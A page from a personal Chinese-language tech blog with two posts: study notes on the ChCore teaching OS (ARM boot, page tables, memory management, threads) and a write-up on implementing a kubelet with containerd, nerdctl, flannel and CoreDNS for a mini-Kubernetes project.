  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/22/chcore/notes/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/01/22/chcore/notes/" class="post-title-link" itemprop="url">chcore-misc</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2024-01-22 20:26:50" itemprop="dateCreated datePublished" datetime="2024-01-22T20:26:50+08:00">2024-01-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/chcore/" itemprop="url" rel="index"><span itemprop="name">chcore</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>2.5k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>9 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="chcore-misc"><a href="#chcore-misc" class="headerlink" title="chcore-misc"></a>chcore-misc</h1><h2 id="arm架构"><a href="#arm架构" class="headerlink" title="arm架构"></a>arm架构</h2><p><code>xxx_elk</code> k&#x3D;0 1 2 3 寄存器表示这个寄存器只能在elk的特权等级访问</p>
<ul>
<li>el0 用户进程</li>
<li>el1 操作系统</li>
<li>el2 虚拟化</li>
<li>el3 trustzone</li>
</ul>
<p>call指令为bl 不使用栈 而是用寄存器<code>x29</code>作为link register <code>ret</code>时从LR中取返回地址</p>
<p><code>SP_EL0</code> <code>SP_EL1</code> 不同特权等级用不同的栈寄存器 所以不需要放到栈中进行保存和恢复</p>
<p><code>svc</code>进入内核</p>
<p><code>eret</code>从当前特权等级k返回 返回地址在ELR_EL3  可以从el1到el0 也可以从el3到el1</p>
<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>树莓派启动</p>
<ol>
<li>通过树莓派厂商写死的GPU来初始化CPU</li>
<li>firmware</li>
<li>运行kernel.img  cpu从0x80000处执行第一行代码</li>
</ol>
<p>对于笔记本 用BIOS (basic input output system)  嵌入式设备（手机）不用BIOS</p>
<p>将可启动设备(磁盘 MBR 0柱面0磁头0扇区 主引导扇区)512字节加载到0x7c00 然后执行 即bootloader</p>
<p>x86 cpu reset后指向0xffff0地址 即bios物理地址</p>
<h2 id="ChCore启动"><a href="#ChCore启动" class="headerlink" title="ChCore启动"></a>ChCore启动</h2><p>编译生成elf时需要排序所有.o 并且设置第一行指令在地址0x80000</p>
<ol>
<li><p>从elX切换到el1</p>
</li>
<li><p>初始化栈  栈实际上是c编译后的elf文件一个已经分配好的空间(4k) 只要把sp设置好就行</p>
<p>由于arm架构使用link register保存返回地址 所以之前的函数调用没有嵌套 可以不需要栈</p>
<p>对于c函数的编译器，并不认为这段c程序是内核初始化，所以仍会一样编译。即使不需要把返回地址压栈，也需要进行传参、寄存器保护等用栈的操作，所以一定要在调用c程序之前初始化好栈。</p>
<p>当初始化好栈之后，完全可以用c语言而非汇编来编程，除非需要用到msr等系统isa指令</p>
</li>
<li><p>页表初始化</p>
<p>ttbr：x86下的cr3  translation table base register</p>
<p>只用48bit     0000+48bit ttbr0翻译；ffff+48bit ttbr1翻译  cpu根据虚拟地址前缀判断使用哪个翻译</p>
<p>ttbr0和ttbr1都是_el1</p>
<p>多级页表 ttbr0_el1_l0 指向ttbr0_el1_l1 指向ttbr0_el1_l2  都是数组 共512个entry 是下一级页表地址或物理地址 用一个bit记录</p>
<p>4级页表  并不是只能最后一级指向物理地址，可以使用大页。这里初始化使用2M大页 之后会拆成4K</p>
<p>虚拟内存最大256T</p>
<table>
<thead>
<tr>
<th></th>
<th>PTE</th>
<th>指向物理内存大小</th>
<th>index</th>
</tr>
</thead>
<tbody><tr>
<td>L0</td>
<td>L1地址</td>
<td>512G</td>
<td>9bit</td>
</tr>
<tr>
<td>L1</td>
<td>L2地址</td>
<td>1G</td>
<td>9bit</td>
</tr>
<tr>
<td>L2</td>
<td>L3地址</td>
<td>2M</td>
<td>9bit</td>
</tr>
<tr>
<td>L3</td>
<td>物理内存地址</td>
<td>4k</td>
<td>9bit</td>
</tr>
</tbody></table>
<p>最后12bit是页偏移 VA与PA相同</p>
<p>0-1G是物理地址，1G-4G是设备地址，设备地址的值随时会变化 所以不允许缓存 PTE64bit 除了记录物理地址的36bit(12bit偏移不需要) 其他bit可用作记录页信息 比如不同特权等级的读写权限</p>
<p>将ttbr1与ttbr0的最后一级页表记录的物理地址范围设置成相同（0G到4G 每个entry2M）这样低地址与高地址的虚拟地址翻译会映射到同一块物理地址，执行相同的代码</p>
<table>
<thead>
<tr>
<th></th>
<th>VA</th>
<th>PA</th>
</tr>
</thead>
<tbody><tr>
<td>ttbr0</td>
<td>0G-1G</td>
<td>0G-1G</td>
</tr>
<tr>
<td>ttbr1</td>
<td>0xffffff0000000000 ,1G</td>
<td>0G-1G</td>
</tr>
</tbody></table>
</li>
<li><p>开启mmu （设置<code>sctlr_el1</code>寄存器的某些bit）从下一条指令开始cpu会自动做地址翻译</p>
<p>应用程序跑在低地址 操作系统跑在高地址 start_kernal从0xffffff0000000000开始</p>
<p>内核高地址 由ttbr1翻译 得到相同PA</p>
<p>应用程序低地址 由ttbr0翻译 得到不同PA</p>
</li>
<li><p>初始化异常向量表 每一项对应一个函数地址(汇编)</p>
<p>对于syscall这个同步异常，构建syscall table 每个系统调用号对应一个函数(void*)</p>
</li>
</ol>
<h2 id="VA"><a href="#VA" class="headerlink" title="VA"></a>VA</h2><p>天然隔离性好</p>
<p>每个CPU核有一个TLB 作为页表的缓存</p>
<ul>
<li><p>进程切换 刷TLB</p>
<p>ASID TLB与页表同时记录 这样就不需要每次刷</p>
</li>
<li><p>修改页表映射 刷TLB (修改页表映射操作的内存使用的缓存并不是TLB TLB是缓存查找PA)</p>
</li>
<li><p>如果其他核也运行了当前进程 则其他核TLB也需要刷</p>
</li>
</ul>
<h2 id="PA"><a href="#PA" class="headerlink" title="PA"></a>PA</h2><p>开启地址翻译后，物理地址实际上也不可见 不可管理了</p>
<p>内核映射到高地址段，通过分配高地址段的虚拟空间来管理实际的物理内存</p>
<p>buddy system存在于内核的虚拟空间中 但映射到真实的物理内存 从而进行管理</p>
<p>用户态需要的虚拟空间经过buddy system分配 所以物理内存上的每个page可能会对应两个虚拟地址，但是内核自己只负责管理，是不会修改的，如果出bug了修改用户空间 称为踩内存</p>
<p>buddy system实际上占用的内存只有metadata，每个物理页会对应一个page数据结构  记录物理页实际大小，需要访存修改的只有metadata 而操作的物理页地址实际上是虚拟地址，并且只需要根据虚拟地址找到metadata和buddy 并不需要访问内容，所以即使内核的start_addr指向的虚拟空间部分并没有映射到真实物理空间也没有关系。</p>
<h2 id="page-table"><a href="#page-table" class="headerlink" title="page table"></a>page table</h2><p>所有page都是通过buddy_system拿到的，都是虚拟地址，存PTE时需要转换成物理地址</p>
<p>PTE需要按给定格式存，最后一位是valid，硬件通过这个bit判断是否缺页(异常，给内核处理)</p>
<p>如果需要换页，只要valid为0触发缺页，其他bit全自己定义即可，与硬件无关</p>
<p>mmu访问时会改pte的access bit 方便换页策略</p>
<p>换页需要有反向映射 修改所有映射到被换出的物理页的虚拟页的PTE</p>
<h2 id="programe"><a href="#programe" class="headerlink" title="programe"></a>programe</h2><p><code>create_root_thread</code>创建进程 同时创建线程</p>
<ul>
<li>进程：创建pmo，加载二进制文件，地址映射</li>
<li>线程：线程上下文，加入调度队列</li>
</ul>
<p>对于spawn创建线程，自己加载好二进制，通过各种系统调用拿到pmo，地址映射，创建线程</p>
<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>进程的地址空间，包含共享的堆，不同线程的内核栈和线程栈（用户态）</p>
<p>chcore中，内核栈地址即为kmalloc拿到的thread结构体的地址，访问thread结构体的成员正好是在内存中栈的对应位置</p>
<p>而线程栈是用户在发出创建线程时手动指定的。内核中的代码sp均为内核栈地址，用户态地址在指定后存在sp_el0中，上下文切换时保存恢复，eret后sp为此地址</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/22/misc/kubelet/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/01/22/misc/kubelet/" class="post-title-link" itemprop="url">kubelet</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2024-01-22 20:18:03" itemprop="dateCreated datePublished" datetime="2024-01-22T20:18:03+08:00">2024-01-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>6.8k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>25 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="kubelet"><a href="#kubelet" class="headerlink" title="kubelet"></a>kubelet</h1><h2 id="containerd"><a href="#containerd" class="headerlink" title="containerd"></a>containerd</h2><p><a target="_blank" rel="noopener" href="https://github.com/containerd/containerd/blob/main/docs/getting-started.md">containerd&#x2F;getting-started.md at main · containerd&#x2F;containerd (github.com)</a></p>
<p>镜像自带，但需要安装cni，高版本没有自带的flannel，用0.9.1版本可以</p>
<h3 id="management"><a href="#management" class="headerlink" title="management"></a>management</h3><p>管理容器，考虑以下三种方法：</p>
<ol>
<li><p>containerd启动时会作为grpc server，监听在<code>unix:///run/containerd/containerd.sock</code> 可以像k8s一样作为grpc client调定义好的CRI接口。但是我们不需要考虑项目不同模块解耦，也不需要考虑支持其他的容器运行时，对于grpc的调用需要自己构造参数，太复杂，并且试了一下很难跑起来。</p>
</li>
<li><p>用exec+ctl</p>
<p>这里可以使用containerd写的nerdctl 兼容docker的命令行格式</p>
<p><a target="_blank" rel="noopener" href="https://github.com/containerd/nerdctl">containerd&#x2F;nerdctl: contaiNERD CTL - Docker-compatible CLI for containerd, with support for Compose, Rootless, eStargz, OCIcrypt, IPFS, … (github.com)</a></p>
<p>完全用cli工具技术含量不高，且需要经过nerdctl这个大框架的解析，效率不高。</p>
<p>可以做一些辅助用途，比如测试、启动pause等。核心的查看容器状态和启动容器还是用containerd的go api</p>
</li>
<li><p>containerd api</p>
<p>实在难用，官方文档一共就readme的几句话，剩下的全靠看源码+猜+看nerdctl源码如何使用</p>
</li>
</ol>
<p>这里研究出的api如下</p>
<ul>
<li>创建容器 包括配置</li>
<li>销毁容器</li>
<li>获取容器状态</li>
<li>获取容器资源信息</li>
</ul>
<h3 id="configuration"><a href="#configuration" class="headerlink" title="configuration"></a>configuration</h3><ul>
<li><p><code>WithMounts</code> 挂载 需要将type和options同时设为bind，否则会报<code>no such device</code>的错</p>
</li>
<li><p><code>WithDomainname</code> <code>WithHostname</code></p>
</li>
<li><p><code>WithLinuxNamespace</code>可以加入其他进程的namespace 但是需要先起task 拿到pid<code>proc/pid/ns/uts</code></p>
<p>启动pause容器后，将此pod内的所有其他容器加入到pause容器的namespace<br>观察containerd的源码可知，就算什么都不配置，默认也是使用了ipc、uts、network、mount、pid这五个命名空间隔离的<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40579389/article/details/125941366">k8s之pause容器</a>按这篇文章的意思 除了mount其他都不需要和pause隔离<br>需要修改的话 一种是自己写配置函数，另一种是使用这个api但只能一个个单独设 </p>
</li>
<li><p><code>WithProcessArgs</code> 启动命令 只有windows支持<code>ProcessCmdLine</code> 不过简单的命令使用起来效果差不多，具体可能涉及到entrypoint 和cmd的区别</p>
</li>
<li><p><code>Withenv</code>  环境变量 <code>&quot;a=c&quot;</code> </p>
</li>
<li><p><code>WithMemoryLimit</code> 单位是字节，如果容器使用内存超过这个数 会被直接kill。</p>
<p>莫名其妙会有bug，报cgroup的错，全网查不到信息，使用“30Mi” 没问题</p>
</li>
<li><p>CPU：</p>
<ul>
<li><code>WithCPUs</code> 将容器进程绑定到指定cpu执行，比如<code>0-3</code>绑定到0 1 2 3  ，<code>1</code>绑定到1</li>
<li><code>WithCPUCFS</code> 调度器，对应到nerdctl 是<code>--cpus</code> 会使用这个api，但是网上说这个参数指定cpu核，这个说法不准确，实际上如果这个值为1，会发生cpu0 和cpu1占用率都在50%的情况，即总使用量为1</li>
<li><code>WithCPUShares</code> 份额</li>
</ul>
</li>
<li><p>port: 仅作标识用，没有意义，所以没有对应api</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4b16c995990b">k8s四种port解析：nodePort、port、targetPort、containerPort - 简书 (jianshu.com)</a> </p>
</li>
<li><p><code>WithContainerLabels</code>这个功能为container提供label</p>
<p>配合<code>client.Containers(ctx,fmt.Sprintf(&quot;labels.%q==%s&quot;, &quot;pod&quot;, pod.Data.Name))</code>一起使用</p>
<p>对于apiserver维护的信息，只是自定义的container apiobject，并不是containerd的可以用来获取真实容器信息的对象，使用containerd的添加label并使用filter的方法可以很方便地拿到一个pod对应的所有containers，否则需要通过遍历容器并比较ID来判断。</p>
</li>
</ul>
<h3 id="task"><a href="#task" class="headerlink" title="task"></a>task</h3><p>containerd的api有一个docker没有的概念task</p>
<p>每个容器创建后，可以开启task，每个task对应一个进程，有对应的api，这时候才会产生新的命名空间</p>
<p>删除容器，先要killtask 然后delete task 最后delete容器</p>
<h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><p>containerd本身管理容器运行时，对于其他功能的提供非常少，包括拉取镜像。使用containerd提供的api只能做到从某个registry拉取，本地image是不行的，不带registry的image也是不行的。</p>
<p>通过观察nerdctl的源码可以得到以下两个扩展：</p>
<ol>
<li><code>pkg/imgutil/dockerconfigresolver/dockerconfigresolver.go/New</code>可知使用docker的resolver可以做到从不同registry(包括自己部署的)拉取镜像</li>
<li><code>pkg/imgutil/imgutil.go/GetExistingImage</code>可知containerd提供<code>NewImage</code>方法，供<code>image.Image</code>对象到<code>containerd.Image</code>的转换，这里<code>image.Image</code>可以通过<code>client.ImageService().Get(imageName)</code>来获取。虽然这里在字符串解析上也必须出现registry的部分，但是实际上不会真的pull，而是从本地获取(<code>nerdctl image list</code>可见即可)</li>
</ol>
<p>如果image在自己部署的registry中但还未被pull，这两种方法都是行不通的，需要自己创建docker resolver然后用WithResolver的配置去pull。这里图方便，解决方案为先用cli工具提前pull，随后紧接着用方法2获取到image对象</p>
<h3 id="pause"><a href="#pause" class="headerlink" title="pause"></a>pause</h3><p>用containerd api设置网络特别麻烦，因此直接用nerdctl跑pause容器，并inspect拿到pid</p>
<p>因此这里直接使用podname+”-pause”为每个pause容器命名</p>
<p>虽然containerd的container对象只能访问.ID，而nerdctl 的 <code>--name</code> 设置的是name并不是id 但还是可以通过containerd的filter+label拿到container对象</p>
<p>然而由于一开始pause容器利用nerdctl实现网络配置，nerdctl本身除了调用containerd的api外，自己有维护一个namestore，在创建容器时会 <code>aquire</code> 需要在销毁时 <code>release</code></p>
<p>所以销毁容器只调containerd的api是不够的，会导致containerd的容器已经被删掉了，但是nerdctl维护的信息还没删，导致下一次创建同名pause容器会有问题</p>
<p>解决方案可以是照nerdctl的代码找到对应的文件路径 然后照抄 <code>release</code>的代码，但这导致minik8s存在与nerdctl耦合的路径配置，较复杂 所以不如销毁pause仍用nerdctl直接实现</p>
<h2 id="network"><a href="#network" class="headerlink" title="network"></a>network</h2><p>containerd相较于docker并没有提供任何网络相关帮助，所以完全依赖CNI插件</p>
<p><code>nerdctl network ls</code> <code>nerdctl run -net host/none</code></p>
<p>CNI插件完成两个目标</p>
<ol>
<li>让每个容器(实际上就是一个pod)拥有一个虚拟网卡，使其拥有访问外网的能力</li>
<li>支持跨node(物理主机)的pod间通信</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41033724/article/details/124976813">Kubernetes容器网络及Flannel插件详解_边缘计算社区的博客-CSDN博客</a></p>
<p>思路：</p>
<ol>
<li>使用flannel插件创建网络 此时每个node都会出现<code>flannel.1</code>的虚拟网卡，可以互相通信</li>
<li>使用<code>nerdctl run -net flannel pause</code> 创建pause容器，此时ip在不同node上会在不同子网中进行分配，不会重复</li>
<li>其他容器加入pause容器的network namespace</li>
</ol>
<h3 id="flannel"><a href="#flannel" class="headerlink" title="flannel"></a>flannel</h3><p><a target="_blank" rel="noopener" href="https://github.com/flannel-io/flannel/blob/master/Documentation/running.md">flannel&#x2F;running.md at master · flannel-io&#x2F;flannel · GitHub</a></p>
<p>flannel目前已经支持了etcd v3版本，不需要切换v2。</p>
<p>etcd v3 v2的数据是不互通的，flanneld启动时默认会在v3里找数据</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lhang/p/17306765.html">Docker容器使用Flannel通信 - L_Hang - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30641567/article/details/123917486">Containerd网络管理_containerd 端口映射_班婕妤的博客-CSDN博客</a></p>
<p>只有master节点通过apiserver使用etcd，kubelet部署在node上 不需要也不能管理etcd</p>
<p>只需要一个etcd 不需要集群 (flannel如果使用etcd集群会出找不到lease的bug)</p>
<p>master <code>etcd --listen-peer-urls=&quot;http://192.168.1.12:2380,http://localhost:2380&quot; --listen-client-urls=&quot;http://192.168.1.12:2379,http://localhost:2379&quot; --initial-advertise-peer-urls=&quot;http://192.168.1.12:2380,http://localhost:2380&quot; --advertise-client-urls=&quot;http://192.168.1.12:2379,http://localhost:2379&quot;</code></p>
<p>master <code>etcdctl --endpoints &quot;http://192.168.1.12:2379&quot; put /coreos.com/network/config &#39;&#123;&quot;NetWork&quot;:&quot;10.2.0.0/16&quot;,&quot;SubnetMin&quot;:&quot;10.2.1.0&quot;,&quot;SubnetMax&quot;: &quot;10.2.20.0&quot;,&quot;Backend&quot;: &#123;&quot;Type&quot;: &quot;vxlan&quot;&#125;&#125;&#39;</code></p>
<p>node启动<code>./flanneld-amd64 -etcd-endpoints=http://192.168.1.12:2379 -iface=ens3</code></p>
<p>这里ens3是主机上能和外界通信的网卡，如果不设置flannel也会自动找</p>
<p>出现<code>flannel.1</code>的网卡。如果修改配置后第一次的flannel1无法消失 出现cni0 重启可以解决</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vim /etc/cni/net.d/10-flannel.conflist</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;flannel&quot;</span>,</span><br><span class="line">  <span class="string">&quot;cniVersion&quot;</span>: <span class="string">&quot;0.3.1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;plugins&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;flannel&quot;</span>,</span><br><span class="line">      <span class="string">&quot;delegate&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;isDefaultGateway&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;portmap&quot;</span>,</span><br><span class="line">      <span class="string">&quot;capabilities&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;portMappings&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>nerdctl run -d -v /home/test_mount:/root/test_mount --net flannel -e port=12345 mcastelino/nettools /root/test_mount/test_network</code> 测试网络可行<br>nerdctl对于网络的解析太复杂了，对于pause并没有很多额外的配置，所以直接用ctl启动pause<br>在加入pause的namespace后发现，虽然其他容器有通过虚拟网卡向外找到合适的转发接口的能力，但是并没有DNS server。这里解决方法是使用外部的<code>nerdctl cp</code>命令将首个容器(pause)的<code>/etc/resolv.conf</code> <code>/etc/hosts</code>文件复制给每个该pod下的容器<br>容器内部部署的服务 可在主机上通过容器ip+容器内端口的方式直接访问到，至此实现pod间通信、主机与pod通信，后续交给kube-proxy</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43266367/article/details/127836595">k8s网络插件之Flannel_林凡修的博客-CSDN博客</a></p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>由于需要给pod增加dns服务，在master上使用coredns作为dns server，解决方法是在resolve.conf中第一条加入master节点的ip（必须53端口）</p>
<p>resolv.conf的逻辑是 如果前一个nameserver连接不上，才会继续向下一个nameserver查找。</p>
<p>如果前一个nameserver连接上了但是没有记录，则会直接报无记录，不会向下一个nameserver查找。</p>
<p>因此必须保证在集群网络通常的情况下，master节点必须启用coredns并且coredns除了minik8s需要的dns服务，必须包括其他通用的dns服务。</p>
<h2 id="资源监控"><a href="#资源监控" class="headerlink" title="资源监控"></a>资源监控</h2><p>参考<code>cmd/nerdctl/container_stats_linux.go</code></p>
<p>可以通过containerd的api拿到metrics对象,不过需要Unmarshal，并且对应的接口离其报错，找不到type，只能照着containerd的源码手动用反射</p>
<h3 id="memory"><a href="#memory" class="headerlink" title="memory"></a>memory</h3><p>是一个定值，表示占用内存大小，单位byte</p>
<h3 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h3><p>进程创建开始之后累计执行的时间，如果跑在2个核上，过了1s，则记为2s<br>通过与上一次获取的cpu执行时间的delta和时间delta可以计算出CPUPercent，和top展示的cpu%是一模一样的<br>CPUPercent和容器创建指定的cpu参数可对应，例如指定cpu&#x3D;1，则cpu%&#x3D;100%;cpu&#x3D;2,cpu%&#x3D;200%（两核跑满）;cpu&#x3D;500m,cpu%&#x3D;50%</p>
<h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><p>kubelet主要做三件事</p>
<ol>
<li>websocket与apiserver保持长连接，监听到pod的创建、销毁状态时进行对应的容器操作。</li>
<li>作为http server接收对于容器资源的请求，获取并计算容器资源后返回。</li>
<li>每隔一段时间检查所有容器的状态，将存在停止容器的pod的状态通过短链接更新给apiserver</li>
</ol>
<p>针对container，1是写，23是读，可能会发生冲突。例如操作2正在统计某容器资源的时候，该容器被操作1删除。</p>
<p>使用读写锁为每个pod上锁，即<code>map[string]sync.RWMutex</code> 其中key为<code>namespace-podname</code> 锁必须细粒度，因为2操作非常慢。</p>
<p>go的map本身是线程不安全的，在对于同一个pod同时拿锁时可能创建两个不同的锁，严重时可能导致对于map的修改崩溃，因此将map替换为<code>sync.Map</code>。虽然同时写map没问题，但是很可能出现t1创建完并拿完锁之后return t2再次创建并拿锁，原因是并没有另一把锁来让对于map中某个key的访问设为临界区。使用<code>sync.Map</code>提供的<code>LoadOrStore(key,value)</code>方法，它会先判断是否存在某个key，如果存在返回<code>map[key]</code>，否则设置<code>map[key]=value</code>后返回value，最后用value.lock。这个方法只是压缩代码行数到了两行，但仍然不是原子的。最好是有类似<code>tbb::concurrent_hash_map::accessor</code>之类的东西。</p>
<p>解决方法是使用一把大锁保护<code>sync.Map</code>，每次写map都需要拿锁，虽然粒度从pod变大到了整个空间，但是这里锁保护的临界区非常小，之后对于map数据结构的写，很快。</p>
<p>在和apiserver连接中断后，任务2会继续做，任务1会每5s再发起一次连接请求，任务3会按之前的频率继续做(由于get请求会失败所以拿不到pod信息)</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/3/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">szy</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Word count total">208k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">12:37</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
